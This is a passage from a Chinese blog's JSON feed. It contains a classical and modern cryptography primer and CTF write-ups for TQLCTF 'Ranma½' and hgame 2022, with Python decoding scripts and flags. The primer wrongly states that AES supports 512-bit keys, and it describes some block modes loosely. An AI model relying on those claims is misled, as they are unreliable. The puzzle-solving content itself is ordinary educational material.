data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682440961/Typera/2023/04/48cfe8124c9d3306a048a7112bec67fd.png\" alt=\"image-20230426000350453\" /><br />\n 如上图所示，当 <strong>n = 3</strong> 的时候，即<strong>密钥 key = 3</strong>，<br />\n原字符表为：ABCDE...WXYZ<br />\n 而<strong>密码表</strong>为：DEFGH...ZABC</p>\n<p>凯撒密码的原理非常简单，对应<strong>破解</strong>的方式也就非常容易，我们只需要列举出 在所有可能的密码表（共 26 种）下<strong>解密</strong> 得到的答案就行了，<br />\n毕竟我们能够很清楚地知道，26 种答案里肯定有我们需要的那一个，再要做的，只是读读哪个更加通顺罢了。</p>\n<h3 id=\"维吉尼亚密码\"><a class=\"anchor\" href=\"#维吉尼亚密码\">#</a> 维吉尼亚密码</h3>\n<p>因为凯撒密码的破解实在是过于简单，所以在凯撒密码的基础上，诞生了一种新的密码，即<strong>维吉尼亚密码</strong>，它蕴含的一个思想就是<strong>多表替换</strong>。<br />\n所谓多表替换，就是准备<strong>多张密码表</strong>，明文的前 n 位选用第 i 张密码表，再后 m 位选用第 j 张... 以此类推，用完所有的密码表之后，就从第 i 张再来过</p>\n<p>而<strong>维吉尼亚加密</strong>，就是准备了 26 张密码表，分别对应<strong>凯撒加密</strong>的 26 种可能的密码表，依次标记为 ABC...XYZ 。上文的 n 和 m ，在<strong>维吉尼亚加密</strong>中都是 1，而所有的 i 和 j 对应密码表的标记，组合起来就是<strong>密钥</strong>。<br />\n下表即为维吉尼亚加密的密码表（总）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682440964/Typera/2023/04/92b5e30160b6461906f1c86ecd48e578.png\" alt=\"image-20230426000421243\" /></p>\n<p>举个例子，假设明文为 <strong>GREAT</strong> ，密钥为 <strong>GOOD</strong><br />\n 首先填充密钥 使其长度与明文一致，即 <strong>GOODG</strong><br />\n 那么，由 G 对应的密码表（列），找到它的第 G 行，得到第一个密文为 M<br />\n 然后，由 O 对应的密码表，找到第 R 行，得到第二个密文为 F<br />\n 同理，我们能获得剩下三个密文为 SDZ，<br />\n即，明文 GREAT ，密钥 GOOD 下的维吉尼亚加密结果为 <strong>MFSDZ</strong></p>\n<p>这样一来，在凯撒密码基础上 通过<strong>多表替换思想</strong>进阶的维吉尼亚密码，对于计算机尚未问世的时代来说，要在<strong>未知密钥</strong>的情况下强行<strong>破解</strong>维吉尼亚密码，绝对是一个大工程。</p>\n<h2 id=\"对称密码体制和非对称密码体制\"><a class=\"anchor\" href=\"#对称密码体制和非对称密码体制\">#</a> 对称密码体制和非对称密码体制</h2>\n<h3 id=\"一对称加密\"><a class=\"anchor\" href=\"#一对称加密\">#</a> 一。对称加密</h3>\n<p>对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。自 1977 年美国颁布 DES（Data Encryption Standard）密码算法作为美国数据加密标准以来，对称密码体制迅速发展，得到了世界各国的关注和普遍应用。对称密码体制从工作方式上可以分为分组加密和序列密码两大类。</p>\n<p>对称加密算法的优点：算法公开、计算量小、加密速度快、加密效率高。</p>\n<p>对称加密算法的缺点：交易双方都使用同样钥匙，安全性得不到保证。此外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的惟一钥匙，这会使得发收信双方所拥有的钥匙数量呈几何级数增长，密钥管理成为用户的负担。对称加密算法在分布式网络系统上使用较为困难，主要是因为密钥管理困难，使用成本较高。而与公开密钥加密算法比起来，对称加密算法能够提供加密和认证却缺乏了签名功能，使得使用范围有所缩小。</p>\n<p>对称加密通常使用的是相对较小的密钥，一般小于 256 bit。因为密钥越大，加密越强，但加密与解密的过程越慢。如果你只用 1 bit 来做这个密钥，那黑客们可以先试着用 0 来解密，不行的话就再用 1 解；但如果你的密钥有 1 MB 大，黑客们可能永远也无法破解，但加密和解密的过程要花费很长的时间。密钥的大小既要照顾到安全性，也要照顾到效率，是一个 trade-off。</p>\n<p>分组密码：也叫块加密 (block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组，有 ECB、CBC、CFB、OFB 四种工作模式。</p>\n<p>序列密码：也叫流加密 (stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过某种复杂的运算（密码算法）产生大量的伪随机位流，用于对明文位流的加密。解密是指用同样的密钥和密码算法及与加密相同的伪随机位流，用以还原明文位流。</p>\n<p>常用对称加密算法包括 DES、3DES、AES</p>\n<ol>\n<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合。</li>\n<li>3DES（Triple DES）：是基于 DES，对一块数据用三个不同的密钥进行三次加密，强度更高。</li>\n<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持 128、192、256、512 位密钥的加密。</li>\n</ol>\n<p>算法特征</p>\n<ol start=\"4\">\n<li>加密方和解密方使用同一个密钥。</li>\n<li>加密解密的速度比较快，适合数据比较长时的使用。</li>\n<li>密钥传输的过程不安全，且容易被破解，密钥管理也比较麻烦。</li>\n</ol>\n<h3 id=\"二非对称加密\"><a class=\"anchor\" href=\"#二非对称加密\">#</a> 二。非对称加密</h3>\n<p>非对称加密为数据的加密与解密提供了一个非常安全的方法，它使用了一对密钥，公钥（public key）和私钥（private key）。私钥只能由一方安全保管，不能外泄，而公钥则可以发给任何请求它的人。非对称加密使用这对密钥中的一个进行加密，而解密则需要另一个密钥。比如，你向银行请求公钥，银行将公钥发给你，你使用公钥对消息加密，那么只有私钥的持有人 -- 银行才能对你的消息解密。与对称加密不同的是，银行不需要将私钥通过网络发送出去，因此安全性大大提高。</p>\n<p>非对称加密算法的优点：安全性更高，公钥是公开的，秘钥是自己保存的，不需要将私钥给别人。</p>\n<p>非对称加密算法的缺点：加密和解密花费时间长、速度慢，只适合对少量数据进行加密。</p>\n<p>对称加密算法相比非对称加密算法来说，加解密的效率要高得多。但是缺陷在于对于秘钥的管理上，以及在非安全信道中通讯时，密钥交换的安全性不能保障。所以在实际的网络环境中，会将两者混合使用。</p>\n<p>非对称加密算法包括 RSA、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法），常见的有 RSA、ECC。</p>\n<h3 id=\"三分组加密的四种工作模式\"><a class=\"anchor\" href=\"#三分组加密的四种工作模式\">#</a> 三。分组加密的四种工作模式</h3>\n<h4 id=\"1ecb\"><a class=\"anchor\" href=\"#1ecb\">#</a> 1.ECB</h4>\n<p>ECB 模式是最简单的加密模式，明文消息被分成固定大小的块（分组），并且每个块被单独加密。每个块的加密和解密都是独立的，且使用相同的方法进行加密，所以可以进行并行计算，但是这种方法一旦有一个块被破解，使用相同的方法可以解密所有的明文数据，安全性比较差。适用于数据较少的情形，加密前需要把明文数据填充到块大小的整倍数。</p>\n<p>ECB 算法优点：<br />\n简单、孤立，每个块单独运算。适合并行运算。传输错误一般只影响当前块。<br />\nECB 算法缺点：<br />\n同明文输出同密文，可能导致明文攻击。</p>\n<h4 id=\"2cbc\"><a class=\"anchor\" href=\"#2cbc\">#</a> 2.CBC</h4>\n<p>CBC 模式中每一个分组要先和前一个分组加密后的数据进行 XOR 异或操作，然后再进行加密。这样每个密文块依赖该块之前的所有明文块，为了保持每条消息都具有唯一性，第一个数据块进行加密之前需要用初始化向量 IV 进行异或操作。CBC 模式是一种最常用的加密模式，它主要缺点是加密是连续的，不能并行处理，并且与 ECB 一样消息块必须填充到块大小的整倍数。</p>\n<p>CBC 算法优点：<br />\n串行化运算，相同明文不同密文。<br />\nCBC 算法缺点：<br />\n需要初始向量。</p>\n<h4 id=\"3cfb\"><a class=\"anchor\" href=\"#3cfb\">#</a> 3.CFB</h4>\n<p>CFB 模式和 CBC 模式比较相似，前一个分组的密文加密后和当前分组的明文 XOR 异或操作生成当前分组的密文。CFB 模式的解密和 CBC 模式的加密在流程上其实是非常相似的。</p>\n<p>CFB 算法优点：<br />\n同明文不同密文，分组密钥转换为流密码。<br />\nCFB 算法缺点：<br />\n串行运算不利并行，传输错误可能导致后续传输块错误。</p>\n<h4 id=\"4ofb\"><a class=\"anchor\" href=\"#4ofb\">#</a> 4.OFB</h4>\n<p>OFB 模式将分组密码转换为同步流密码，也就是说可以根据明文长度先独立生成相应长度的流密码。通过流程图可以看出，OFB 和 CFB 非常相似，CFB 是前一个分组的密文加密后 XOR 当前分组明文，OFB 是前一个分组与前一个明文块异或之前的流密码 XOR 当前分组明文。由于异或操作的对称性，OFB 模式的解密和加密完全一样的流程。</p>\n<p>OFB 算法优点：<br />\n同明文不同密文，分组密钥转换为流密码。<br />\nOFB 算法缺点：<br />\n串行运算不利并行，传输错误可能导致后续传输块错误。</p>\n",
            "tags": [
                "Python",
                "Crypto"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/",
            "title": "TQLCTF-MISC-Ranma½",
            "date_published": "2022-02-22T14:36:41.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"ranma12\"><a class=\"anchor\" href=\"#ranma12\">#</a> Ranma½</h3>\n<p>终归还是少了点经验，以及一些奇奇怪怪的知识。。。</p>\n<h4 id=\"utf-8可变长编码\"><a class=\"anchor\" href=\"#utf-8可变长编码\">#</a> UTF-8 可变长编码</h4>\n<p>首先一定要详细了解 UTF-8 编码，<br />\n完整的表如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438191/Typera/2023/04/fdfd2d8940cbcb3dad4d6ee71124333c.png\" alt=\"image-20230425235627337\" /></p>\n<blockquote>\n<p>图中一行的  <code>xxx...</code>  部分组合起来即为对应的 Unicode 代码</p>\n</blockquote>\n<p>可能这样还是比较难以理解，那就仔细阅读下面的例子就行了：</p>\n<p>希伯来语字母 א 的 Unicode 代码是 U+<strong>05D0</strong>，UTF-8 是 <strong>0xD7 0x90</strong>，<br />\n则 Unicode to UTF-8 转换如下：</p>\n<ul>\n<li>首先判断它属于哪一行：<br />\nU+0080 到 U+07FF，观察表中对应行，说明它使用双字节，即 110<strong>xxxxx</strong> 10<strong>xxxxxx</strong></li>\n<li>然后分解十六进制的<strong> 0x05D0</strong>，换算成二进制就是（0）101-1101-0000</li>\n<li>最后，把这 11 位数按顺序填入前后的 &quot;x&quot; 部分：110<strong>10111</strong> 10<strong>010000</strong></li>\n</ul>\n<p>110<strong>10111</strong> 10<strong>010000</strong> 换成 16 进制就是 <strong>D7 90</strong>，即对应的 UTF-8 编码</p>\n<p>看懂了上述例子，UTF-8 to Unicode 就是简单反过来就行了</p>\n<h4 id=\"信息隐藏的思路\"><a class=\"anchor\" href=\"#信息隐藏的思路\">#</a> 信息隐藏的思路</h4>\n<p>到这里，我们就了解了 UTF-8 编码 “可变长” 的特点，<br />\n既然它是可变长的，那么我们就可以利用<strong>这个特性</strong>去隐藏信息：<br />\n直接用一般的文本编辑器打开题目给的文件，会有很多乱码，因为它们大多是逐字节转换的，而 UTF-8 的单个字符 可能有 1~4 个字节的长度，</p>\n<p>因此，如果我们要隐藏 <strong>A</strong> 字符，Unicode 就是 <strong>0x41</strong>，换算成二进制就是 <strong>100 0001</strong>，<br />\n再假设我们要把它藏到 UTF-8 编码的<strong>第二行 U+0080 到 U+07FF</strong> 里面，那么我们一共需要 11 个数字，<br />\n于是人为地在高位填充 4 个 0，得到：<strong>000-0100-0001</strong>，再将这 11 个数字填入表中对应的 x 部分，就得到：110<strong>00001</strong> 10<strong>000001</strong>，即 UTF-8 编码的 <strong>C1 81</strong>，从而骗过大部分的文本编辑器</p>\n<h4 id=\"解题过程\"><a class=\"anchor\" href=\"#解题过程\">#</a> 解题过程</h4>\n<p>实际上有挺多方法，用 vim 打开，或者用 WinRAR 的 “查看” 打开（这个属实有点奇怪）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438200/Typera/2023/04/1771f16334a694ed24fac59a74971010.png\" alt=\"image-20230425235636085\" /><br />\n 或者可以写脚本分析：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">x,y,z=[],[],[]</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;Ranma&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tStr = f.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"keyword\">not</span> Str:<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\tx.append(binascii.hexlify(Str))</span><br><span class=\"line\">\t<span class=\"keyword\">finally</span>:</span><br><span class=\"line\">\t\tf.close() <span class=\"comment\"># 读文件，将16进制字串存入list x</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(x)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>)&lt;<span class=\"number\">128</span>:</span><br><span class=\"line\">\t\ty.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>))) <span class=\"comment\"># 小于128的直接chr()转换ASCII码</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>)&gt;<span class=\"number\">127</span>:</span><br><span class=\"line\">\t\ty.append(<span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>))) <span class=\"comment\"># 大于128的转换为二进制分析</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(y)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b110&#x27;</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 如果是第二行的情况</span></span><br><span class=\"line\">\t\ty[i]=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(y[i][<span class=\"number\">5</span>:]+(y[i+<span class=\"number\">1</span>])[<span class=\"number\">4</span>:],<span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b1110&#x27;</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 如果是第三行的情况</span></span><br><span class=\"line\">\t\ty[i]=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(y[i][<span class=\"number\">6</span>:]+(y[i+<span class=\"number\">1</span>])[<span class=\"number\">4</span>:]+(y[i+<span class=\"number\">2</span>])[<span class=\"number\">4</span>:],<span class=\"number\">2</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(y)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 去除多余项并合并</span></span><br><span class=\"line\">\t\tz.append(y[i])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join(z))</span><br></pre></td></tr></table></figure><br />\n 得到：</p>\n<blockquote QFOLP6_KRZ1Q=\"\">\n<p>KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd.  Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB</p>\n</blockquote>\n<p>观察猜测是维吉尼亚加密，</p>\n<ol>\n<li>\n<p>直接爆破 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGNvZGUuZnIvdmlnZW5lcmUtY2lwaGVy\">在线网址</span> ：<br />\n点击 AUTOMATIC DECRYPTION，爆破即可</p>\n</li>\n<li>\n<p>看官方 wp，（这个密钥要拿到脑洞也太大了吧。。。）<br />\n依次列举出 UTF-8 编码文字的长度，长度为 1 的字符转换为<strong>点</strong>，长度为 2 的字符转换为<strong>线</strong>，长度为 3 的字符转换成<strong>分隔符</strong>，经过 <strong>Morse</strong> 解读获得密钥<br />\n (￣▽￣)&quot;<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438209/Typera/2023/04/150cd961046421d365382e0994f34fba.png\" alt=\"image-20230425235644738\" /><br />\nflag： <code>TQLCTF&#123;CODIN6_WOR1D&#125;</code></p>\n</li>\n</ol>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/",
            "title": "2022hgame week1",
            "date_published": "2022-02-05T04:46:27.000Z",
            "content_html": "<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"dancing_line\"><a class=\"anchor\" href=\"#dancing_line\">#</a> Dancing_Line</h3>\n<p>有点靠脑洞啊，这道 crypto 不讲武德 /_ \\ ，不过仔细看看还是大概能猜到的～</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437580/Typera/2023/04/d902f3ec8dfa08547fca2ab2f0d0f237.bmp\" alt=\"\" /><br />\n图片上有一条线，放大可以看出，每隔一小段会有一个黑点<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437729/Typera/2023/04/f02b3b2084d99f2b7639a572df5b0d8a.png\" alt=\"image-20230425234706530\" /><br />\n 所以，我用 python PIL 库写个脚本导出黑点的坐标</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">img=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./Dancing_Line.bmp&#x27;</span>)</span><br><span class=\"line\">w,h=img.size</span><br><span class=\"line\"><span class=\"comment\">#print(w,h)</span></span><br><span class=\"line\">pos=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(w):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(h):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))!=(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))==(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>):</span><br><span class=\"line\">\t\t\t\tpos.append((i,j))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pos)</span><br></pre></td></tr></table></figure><br />\n 得到如下字串：</p>\n<blockquote>\n<p>[(0, 0), (5, 3), (8, 8), (13, 11), (16, 16), (20, 20), (22, 26), (28, 28), (33, 31), (36, 36), (40, 40), (45, 43), (48, 48), (51, 53), (53, 59), (58, 62), (63, 65), (66, 70), (70, 74), (72, 80), (77, 83), (81, 87), (83, 93), (87, 97), (90, 102), (93, 107), (98, 110), (100, 116), (105, 119), (109, 123), (112, 128), (116, 132), (120, 136), (122, 142), (127, 145), (131, 149), (133, 155), (135, 161)]</p>\n</blockquote>\n<p>仔细找找规律可以发现，相邻黑点坐标之差均为 8<br />\n 同理导出线上所有点的坐标，不难看出，相邻点的坐标，要么是横坐标加 1，要么是纵坐标加 1，</p>\n<p>再结合相邻黑点坐标差为 8 这个数字，所以推测这应该是一个二进制编码 （。＾▽＾）<br />\n几番尝试之后确定为，纵坐标增长为 1，横坐标增长为 0</p>\n<p>最后将二进制转换为 ASCII 码，即可得到 flag</p>\n<p>完整 exp 如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">img=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./Dancing_Line.bmp&#x27;</span>)</span><br><span class=\"line\">w,h=img.size</span><br><span class=\"line\"><span class=\"comment\">#print(w,h)</span></span><br><span class=\"line\">pos=[]</span><br><span class=\"line\">pos_all=[]</span><br><span class=\"line\">t=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(w):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(h):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))!=(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))==(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>):</span><br><span class=\"line\">\t\t\t\tpos.append((i,j))</span><br><span class=\"line\">\t\t\tpos_all.append((i,j))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(pos)</span></span><br><span class=\"line\"><span class=\"comment\">#print(pos_all)</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"built_in\">len</span>(pos_all)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> pos_all[k][<span class=\"number\">0</span>]-pos_all[k-<span class=\"number\">1</span>][<span class=\"number\">0</span>]==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tt=t+<span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> pos_all[k][<span class=\"number\">1</span>]-pos_all[k-<span class=\"number\">1</span>][<span class=\"number\">1</span>]==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tt=t+<span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">t=<span class=\"built_in\">int</span>(t,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t.to_bytes((t.bit_length() + <span class=\"number\">7</span>) // <span class=\"number\">8</span>, <span class=\"string\">&#x27;big&#x27;</span>).decode())</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"english-novel\"><a class=\"anchor\" href=\"#english-novel\">#</a> English Novel</h3>\n<p>做是做出来了，就是原来写的脚本稀烂，由于标点符号的原因，整理出来的 keys，有些地方不太对，这就导致我最开始写的脚本，得到的 flag 其实是长这样的： <code>hgame&#123;V0_y0u_kn0w_'En0wn-pla1ntext_derzwn'?&#125;</code> <br />\n(￣▽￣)&quot;</p>\n<p>然后我直接猜出最终的 flag... 讲真挺好猜的<br />\n不过看过别人的 wp 之后，我就在原基础上改善了（现在没问题了）</p>\n<p>这道题思路其实很简单，<br />\n题目给了我们两个文件夹，一个 original，一个 encrypt，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1mbGFnLWs4NGZ1aTB3eDYwMmEyNzVhLnhuLS1lbmNlbmNyeXB0LWpoN3EucHk=\">还给了一个 flag.enc 和 encrypt.py</span><br />\n 首先都打开来看看，original 里面是打乱的 English Novel 的原文，encrypt 里面大概就是通过某种加密得到的打乱的密文，flag.enc 里面大概就是用同样方法加密得到的 flag， encrypt.py 就是加密的方法</p>\n<p>打开 encrypt.py 看看，其实就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>m</mi><mo>+</mo><mi>k</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">c=(m+k) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span><br />\n 那解密就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>c</mi><mo>−</mo><mi>k</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">m=(c-k) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span> （c 为密文，m 为明文，k 为密钥）<br />\n所以显然我们的任务就是得到这个密钥 k，然后解密 flag.enc 里的密文</p>\n<p>而题目把一大堆明文和密文都给我们了，所以就是已知明文攻击，<br />\n所以， <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>=</mo><mo 